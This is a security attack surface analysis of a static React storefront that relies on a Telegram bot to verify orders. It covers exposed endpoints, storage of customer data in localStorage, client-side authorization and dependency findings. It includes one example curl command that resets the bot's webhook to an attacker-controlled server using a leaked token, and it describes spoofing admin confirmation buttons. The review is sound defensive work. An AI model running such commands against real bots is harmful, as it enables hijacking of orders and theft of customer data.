# Attack Surface Analysis — Software Solutions BD

This document maps all reachable entry points, exposed interfaces, data ingestion vectors, communication pathways, and external dependencies of the **Software Solutions BD** system.

---

## 1. Overview of System Boundaries

```
                                  PUBLIC INTERNET
                                         │
                   ┌─────────────────────┴─────────────────────┐
                   ▼                                           ▼
          [Web Application]                           [Third-Party Services]
    Host: Vercel / GitHub Pages                    Telegram Bot API (api.telegram.org)
    Protocol: HTTPS                                Meta Pixel (connect.facebook.net)
                   │                               WhatsApp Support (wa.me)
                   ├───────────────┐                           ▲
                   ▼               ▼                           │
              Static Pages     Client SPA                      │
              • /              • #order                        │
              • /404.html      • #payment                      │
                               │                               │
                               └────── Browser HTTP Calls ─────┘
                                       (getUpdates, sendMessage,
                                        editMessageReplyMarkup)
```

The application has **zero private or internal networks**. Because it is delivered entirely as static assets to the user's browser, the application runtime is co-located with the attacker within the browser environment.

---

## 2. Public Endpoints (Client-Side Routes & Static Files)

Because the project is a React SPA running on static hosting, "endpoints" consist of static HTML/JS/CSS assets and client-side hash routes:

| Route / Asset | Method | Exposure | Description / Functionality | Security Controls in Place |
| :--- | :--- | :--- | :--- | :--- |
| `/` | `GET` | Public | Main landing page containing Autodesk showcase and order section | HSTS, X-Frame-Options, X-Content-Type-Options |
| `/#order` | `GET` (Hash) | Public | Smooth-scroll anchor pointing to order placement form | Client-side input sanitization |
| `/#payment` | `GET` (Hash) | Public | Renders `PaymentGatewayPage.jsx` when an active order is in state | Client-side state gate |
| `/404.html` | `GET` | Public | Standalone cyber-styled 404 error page for unmapped paths | HSTS, robots noindex |
| `/.well-known/security.txt`| `GET` | Public | Security contact details pointing to `Support@solutionsbd.com` | Plaintext policy file |
| `/robots.txt` | `GET` | Public | Crawler instructions disallowing sensitive directory probes | Disallow rules for `/.env*`, `/.git*`, etc. |
| `/assets/*` | `GET` | Public | Compiled JavaScript (`index-*.js`) and CSS bundles | Cache-Control: max-age=31536000, immutable |

---

## 3. Internal Endpoints & Backend Surfaces

* **Internal API Routes**: **None**. There are no `/api/*`, `/graphql`, or RPC endpoints hosted on the domain.
* **Serverless Functions**: **None currently deployed**. The repository does not contain a `api/` directory or serverless handlers.
* **Microservices**: **None**.
* **Implication**: Any functionality that traditionally occurs on an internal backend (e.g. creating orders, validating bank transactions, notifying admins, checking order status) is currently executed on the client-side attack surface.

---

## 4. Authentication & Authorization Surfaces

### 4.1. Customer Authentication Surface
* **Status**: **Non-existent (By Design)**.
* Customers do not register, authenticate, or maintain sessions.
* Orders are submitted anonymously with self-reported contact information.

### 4.2. Administrative Authentication & Authorization Surface
* **Status**: **Outsourced to Telegram Client**.
* There is **no web-based admin portal**, `/admin` login page, or JWT/session-based authentication mechanism.
* Administrative authorization is conducted via **Telegram inline keyboard callbacks** (`confirm_<refId>` and `invalid_<refId>`).
* **Vulnerability in Authorization Verification**:
  In [`src/services/telegramService.js`](file:///c:/Users/irfan/Desktop/SSolutions/src/services/telegramService.js#L264-L290), verification authorization is checked on the client:
  ```javascript
  const isConfirm = dataStr === `CONFIRM_${cleanTargetRef}` || dataStr === `CONFIRMED_DONE_${cleanTargetRef}`;
  if (isConfirm) {
    return { status: 'CONFIRMED' };
  }
  ```
  Because the client executes this logic, any client can simulate a verified status by injecting state directly into React or local storage.

---

## 5. User Input Surfaces

All user-supplied input originates from two interactive form components:

```
[User Input Surface 1: Order Form] (src/components/OrderSection.jsx)
  ├── fullName       (Text input, max 80 chars)
  ├── email          (Email input, max 100 chars, regex tested)
  ├── phone          (Tel input, max 25 chars, numeric + plus filter)
  ├── quantity       (Number selector, min 1)
  ├── duration       (Dropdown / button select: 1/2/3 Years)
  ├── couponCode     (Text input, uppercase trimmed: SAVE10/SAFE10)
  └── requirements   (Textarea, max 300 chars)

[User Input Surface 2: Payment Form] (src/components/payment/PaymentGatewayPage.jsx)
  ├── senderNumber   (Tel input, filtered to 0-9 and +)
  └── trxId          (Text input, alphanumeric uppercase, min 8 chars)
```

### Analysis of Input Sanitization:
* **Client-Side Regex Sanitization**:
  * `OrderSection.jsx` lines 155–158:
    ```javascript
    const cleanName = fullName.trim().replace(/[<>]/g, '').slice(0, 80);
    const cleanEmail = email.trim().replace(/[<>]/g, '').slice(0, 100);
    const cleanPhone = phone.trim().replace(/[^0-9+\s-]/g, '').slice(0, 25);
    const cleanReq = requirements ? requirements.trim().replace(/[<>]/g, '').slice(0, 300) : '';
    ```
  * `PaymentGatewayPage.jsx` lines 145–147:
    ```javascript
    const cleanSender = senderNumber.trim().replace(/[^0-9+]/g, '');
    const cleanTrx = trxId.trim().toUpperCase().replace(/[^A-Z0-9]/g, '');
    ```
* **HTML Entity Sanitization for Telegram**:
  * `telegramService.js` lines 49–56 (`escapeHtml`):
    Encodes `&`, `<`, `>`, and `"` before string interpolation into Telegram HTML message bodies.
* **Limitations**:
  Client-side input sanitization can be easily bypassed by sending HTTP requests directly to the underlying endpoints or overriding JavaScript functions in the browser console.

---

## 6. File Upload Surface

* **Status**: **None (Zero Surface)**.
* The application does not accept file attachments, avatar uploads, proof-of-payment screenshots, or document uploads.
* There are no `<input type="file">` elements or multipart/form-data parsers in the project.

---

## 7. Database & Storage Surfaces

### 7.1. Database
* **Status**: **No Database Attached**.
* There are no SQL connections (MySQL, PostgreSQL), NoSQL instances (MongoDB), or Firebase/Supabase integrations.

### 7.2. Client Storage (`localStorage`)
The browser `localStorage` acts as the persistent state layer:

| Key | Contents | Written By | Read By | Security Implication |
| :--- | :--- | :--- | :--- | :--- |
| `softwaresolutions_last_submission` | Full order payload (Name, email, phone, sender number, TrxID, price) | `PaymentGatewayPage.jsx` (L179) | `PaymentGatewayPage.jsx` (L313, L395) | Stores sensitive customer PII unencrypted in browser storage |
| `softwaresolutions_active_order` | Pending order draft before payment | `LanguageContext.jsx` (L66) | `LanguageContext.jsx` (L56) | Unencrypted customer data accessible across browser tabs |
| `softwaresolutions_telegram_chat_id` | Admin's Telegram Chat ID | `telegramService.js` (L12) | `telegramService.js` (L7) | Exposes admin destination ID in local browser storage |
| `softwaresolutions_lang` | Preferred UI language (`"en"` or `"bn"`) | `LanguageContext.jsx` (L19) | `LanguageContext.jsx` (L9) | Low risk preference key |

---

## 8. Webhooks & Event Listeners

* **Incoming Webhooks**: **None**. The project does not run an HTTP server to listen for webhooks from bKash, Nagad, or Telegram.
* **Outgoing Webhooks**: Direct Telegram Bot API HTTP POST calls.
* **Webhook Hijack Risk**:
  Because the Telegram Bot Token is exposed in the client JavaScript bundle, an external attacker can call:
  ```bash
  curl -X POST "https://api.telegram.org/bot<TOKEN>/setWebhook" -d "url=https://attacker-controlled-server.com/hook"
  ```
  Setting a webhook on Telegram immediately disables `getUpdates` polling, breaking the order verification flow for all users and routing all bot notifications directly to the attacker.

---

## 9. Third-Party Integrations & External Data Flows

```
┌────────────────────────────────────────────────────────────────────────┐
│                        Third-Party Data Matrix                         │
├──────────────────────┬──────────────────────┬──────────────────────────┤
│ Third Party Service  │ Integration Pathway  │ Data Shared / Received   │
├──────────────────────┼──────────────────────┼──────────────────────────┤
│ Telegram Bot API     │ HTTPS fetch() calls  │ Customer Name, Email,    │
│ (api.telegram.org)   │ from browser         │ Phone, TrxID, Gateway,   │
│                      │                      │ Amount, Reference ID     │
├──────────────────────┼──────────────────────┼──────────────────────────┤
│ Meta (Facebook)      │ External script      │ Page views, purchase     │
│ Pixel                │ (fbevents.js)        │ currency & amount,       │
│                      │                      │ initiated checkout events│
├──────────────────────┼──────────────────────┼──────────────────────────┤
│ WhatsApp             │ Standard <a> link    │ Support message with     │
│ (wa.me)              │ redirect to external │ order reference ID,      │
│                      │ URL                  │ sender number & TrxID    │
├──────────────────────┼──────────────────────┼──────────────────────────┤
│ Google Fonts         │ External stylesheet  │ Client IP, user-agent,   │
│ (fonts.googleapis)   │ and font files       │ referer header           │
└──────────────────────┴──────────────────────┴──────────────────────────┘
```

---

## 10. Admin Surfaces

* **Web-Based Admin Surface**: None.
* **Telegram Bot Admin Surface**:
  * Admin receives rich HTML cards in their Telegram chat.
  * Admin interacts via inline buttons:
    * `confirm_<orderRefId>`
    * `invalid_<orderRefId>`
* **Attack Vector**:
  An attacker who extracts the bot token can invoke `https://api.telegram.org/bot<TOKEN>/sendMessage` to send spoofed order verification buttons or trigger `answerCallbackQuery` directly, bypassing the real human admin.

---

## 11. Network & Deployment Exposure

### 11.1. Hosting Configuration (`vercel.json`)
* **Security Headers Configured**:
  * `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`
  * `X-Content-Type-Options: nosniff`
  * `X-Frame-Options: SAMEORIGIN`
  * `X-XSS-Protection: 1; mode=block`
  * `Referrer-Policy: strict-origin-when-cross-origin`
  * `Permissions-Policy: camera=(), microphone=(), geolocation=(), browsing-topics=()`
* **Security Headers Missing**:
  * **Content-Security-Policy (CSP)**: There is no CSP header declared. Any injected or rogue third-party script can make unauthorized outbound network connections or execute scripts.
* **Rewrite Rules (Probe Protection)**:
  * In `vercel.json` lines 53–98, requests targeting `.env`, `.git`, `wp-admin`, `xmlrpc.php`, `*.php`, `*.sql`, `*.bak`, and `*.config` are intercepted and routed to `/404.html`.

### 11.2. Fallback Hosting (GitHub Pages / Traditional CDN)
* If deployed on GitHub Pages or basic object storage without Vercel's edge proxy, the headers defined in `vercel.json` are **not applied**, as GitHub Pages does not evaluate `vercel.json`.

---

## 12. Dependencies & Supply Chain Surface

### 12.1. Production Runtime Dependencies
* `react` (^18.3.1)
* `react-dom` (^18.3.1)
* `lucide-react` (^1.16.0)
* `clsx` (^2.1.1)
* `tailwind-merge` (^2.6.0)

*Assessment*: Runtime footprint is minimal and standard. No known critical vulnerabilities exist in the core runtime dependencies (`react`, `react-dom`, `lucide-react`, `clsx`, `tailwind-merge`).

### 12.2. Development & Build Dependencies
* `vite` (^5.4.11)
* `@vitejs/plugin-react` (^4.3.4)
* `tailwindcss` (^3.4.17)
* `postcss` (^8.4.49)
* `autoprefixer` (^10.4.20)

*Audit Findings (`npm audit`)*:
* **`esbuild` (<=0.24.2)**: Moderate severity (GHSA-67mh-4wv8-2f99) — Dev server request exposure.
* **`braces` (via chokidar/tailwindcss)**: High severity (GHSA-vfj7-8cjw-p6xm) — ReDoS via nested glob patterns.
* **`postcss-selector-parser` (<7.1.6)**: Moderate severity (GHSA-rj75-hqrm-r3gf) — Quadratic complexity CPU exhaustion.
* *Context*: These vulnerabilities affect the development build chain and build-time parsing; they do not introduce remote code execution vectors into the production client bundle.

---

## 13. Attack Surface Summary Table

| Surface Component | Exposure Level | Primary Threat | Key Risk Location |
| :--- | :--- | :--- | :--- |
| **Telegram Bot API Integration** | **Critical** | Credential harvesting, webhook hijacking, update leakage | `src/services/telegramService.js` |
| **Order Status Polling Loop** | **High** | Telegram rate-limit exhaustion (HTTP 429), Denial of Service | `PaymentGatewayPage.jsx` (L238–244) |
| **Browser `localStorage`** | **High** | Unencrypted storage of customer PII and transaction records | `PaymentGatewayPage.jsx` (L179), `LanguageContext.jsx` |
| **Order Submission Form** | **Medium** | Automated form submission, spam notification flooding | `OrderSection.jsx` (L147) |
| **Meta Pixel Script Injection** | **Medium** | Unrestricted third-party script execution without CSP | `src/services/pixelService.js` (L17–32) |
| **Vercel Security Headers** | **Low** | Missing Content Security Policy (CSP) header | `vercel.json` (L4–33) |
| **File Uploads** | **None** | No file upload functionality present | N/A |
| **Database Interfaces** | **None** | No database attached to the application | N/A |

